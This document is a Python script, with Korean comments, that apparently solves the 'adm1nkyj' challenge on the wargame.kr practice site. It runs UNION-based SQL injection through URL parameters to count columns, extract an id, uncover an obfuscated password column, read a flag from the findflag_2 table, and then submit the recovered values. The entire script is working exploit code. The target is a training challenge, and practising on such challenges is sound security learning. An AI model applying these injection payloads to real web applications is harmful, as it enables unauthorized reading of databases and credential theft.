from requests import *
from urllib import parse
url='http://wargame.kr:8080/adm1nkyj?pw=&flag=abs&id=\' union select 1'
#findflag_2 테이블 속성 갯수 및 id 속성의 순서
for i in range(1,10):
    if i != 1:
        url+=f',{i}'
    url2=url+'%23'
    response=get(url=url2)
    if response.text.find('Hello') != -1:
        print('findflag_2의 속성 갯수:',i)
        response=response.text.replace('Hello','')
        response=response.replace('<hr>','')
        print(f'id는{response}번째 속성')

#id
url='http://wargame.kr:8080/adm1nkyj?pw=&flag=abs&id=\' or 1 order by 5 limit 1 %23'
response=get(url=url)
response=response.text.replace('Hello','')
response=response.replace('<hr>','')
response=response.replace(' ','')
id=response
print(f'id값은 {response}이다.')

#pw_column
url='http://wargame.kr:8080/adm1nkyj?pw=,3,4,5 from findflag_2 limit 1 %23&flag=abs&id=\' union select 1,'
response=get(url=url)
response=response.text.replace('Hello','')
response=response.replace('<hr>','')
response=response.replace(' and','')
response=response.replace('=','')
response=response.replace(' ','')
pw_column=response

#pw
url='http://wargame.kr:8080/adm1nkyj?pw=&id=\' union select 1,xPw4coaa1sslfe,3,4,5 %23'
response=get(url=url)
response=response.text.replace('Hello','')
response=response.replace('<hr>','')
response=response.replace(' and','')
response=response.replace('=','')
response=response.replace(' ','')
pw=response
pw=parse.quote(pw)
print(f'pw값은 {response}이다.')

#flag
url='http://wargame.kr:8080/adm1nkyj?pw=&flag=abs&id=\' union select 1,flag,3,4,5 from(select 1,2,3,4 flag,5 union select * from findflag_2 limit 1,1)x %23'
response=get(url=url)
response=response.text.replace('Hello','')
response=response.replace('<hr>','')
response=response.replace(' ','')
flag=response
print(f'flag값은 {response}이다.')

url=f'http://wargame.kr:8080/adm1nkyj?pw={pw}&flag={flag}&id={id}'
response=get(url=url)
print(response.text)
